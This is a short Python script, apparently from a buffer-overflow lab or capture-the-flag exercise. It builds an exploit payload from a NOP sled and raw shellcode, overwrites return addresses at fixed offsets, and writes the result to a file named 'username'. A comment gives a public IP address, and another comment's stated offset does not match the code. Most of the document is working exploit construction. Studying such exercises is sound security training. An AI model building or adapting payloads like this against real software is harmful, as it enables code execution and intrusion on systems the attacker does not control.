import sys
# public ip = 20.0.230.164
shellcode= (
        "\x68\x60\xC8\x55\x56\x68\x60\xC8\x55\x56\xBB\x6C\x52\x55\x55\xFF\xD3\x6A\x04\x68\x88\x80\x08\x08\xBB\x09\x52\x55\x55\xFF\xD3"
        ).encode('latin-1')

# Fill the content with NOPs
content = bytearray(0x90 for i in range(1275))
# Put the shellcode at the end
start = 1275 - len(shellcode)
content[start:] = shellcode

 # Put the address at offset 112
ret = 0x7fffffffc5a0 + 105
content[584:592] = (ret).to_bytes(8,byteorder='little')
ret = 0x5655c860
content[592:600] = (ret).to_bytes(8,byteorder='little')
ret = 0x5655c860
content[600:608] = (ret).to_bytes(8,byteorder='little')

  # Write the content to a file
with open('username', 'wb') as f:
    f.write(content)